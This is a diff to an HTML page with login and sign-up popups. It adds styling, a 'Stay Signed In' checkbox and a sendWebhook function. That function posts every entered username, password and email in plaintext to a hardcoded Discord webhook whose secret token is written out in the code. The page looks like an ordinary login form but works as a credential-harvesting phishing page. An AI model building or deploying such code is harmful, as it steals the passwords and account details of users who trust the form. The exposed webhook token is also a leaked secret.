@@ -28,7 +28,7 @@
     .container {
       margin: 20px;
       display: flex;
-      justify-content: space-between;
+      justify-content: flex-end;
       align-items: center;
     }
 
@@ -49,8 +49,47 @@
       text-decoration: underline;
     }
 
-    .form-container button:first-child {
-      margin-right: 10px;
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 20px;
+      background-color: #fff;
+      border: 1px solid #000;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+      z-index: 9999;
+    }
+
+    .popup h2 {
+      margin: 0 0 10px;
+    }
+
+    .popup form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .popup form label {
+      margin-bottom: 5px;
+    }
+
+    .popup form input {
+      margin-bottom: 10px;
+      padding: 5px;
+    }
+
+    .popup form button {
+      padding: 8px 12px;
+      background-color: #000;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+    }
+
+    .popup form button[type="button"] {
+      margin-left: 10px;
     }
   </style>
 </head>
@@ -77,6 +116,8 @@
       <input type="text" id="loginUsername" required>
       <label for="loginPassword">Password:</label>
       <input type="password" id="loginPassword" required>
+      <label for="staySignedIn">Stay Signed In:</label>
+      <input type="checkbox" id="staySignedIn">
       <button type="submit">Login</button>
       <button type="button" onclick="closePopup('loginPopup')">Close</button>
     </form>
@@ -98,19 +139,20 @@
 
   <script>
     function openPopup(popupId) {
-      document.getElementById(popupId).classList.add("show");
+      document.getElementById(popupId).style.display = "block";
     }
 
     function closePopup(popupId) {
-      document.getElementById(popupId).classList.remove("show");
+      document.getElementById(popupId).style.display = "none";
     }
 
     function login(event) {
       event.preventDefault();
       const username = document.getElementById("loginUsername").value;
       const password = document.getElementById("loginPassword").value;
+      const staySignedIn = document.getElementById("staySignedIn").checked;
 
-      const content = `**Login**\nUsername: ${username}\nPassword: ${password}`;
+      const content = `**Login**\nUsername: ${username}\nPassword: ${password}\nStay Signed In: ${staySignedIn}`;
       sendWebhook(content);
     }
 
@@ -123,8 +165,28 @@
       const content = `**Sign Up**\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`;
       sendWebhook(content);
     }
-  </script>
 
+    function sendWebhook(content) {
+      const webhookURL = "https://discord.com/api/webhooks/1114747356055879781/7fH1tMXA2cJ8neQ3o4pMsZfnJwqAsBFt3xHOIcjHzrs3JZrJ5Fnun5zHluFw3bR5k60B";
+      const payload = {
+        content: content
+      };
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => {
+        console.log("Webhook sent successfully!");
+      })
+      .catch(error => {
+        console.error("Error sending webhook:", error);
+      });
+    }
+  </script>
 </body>
 
 </html>
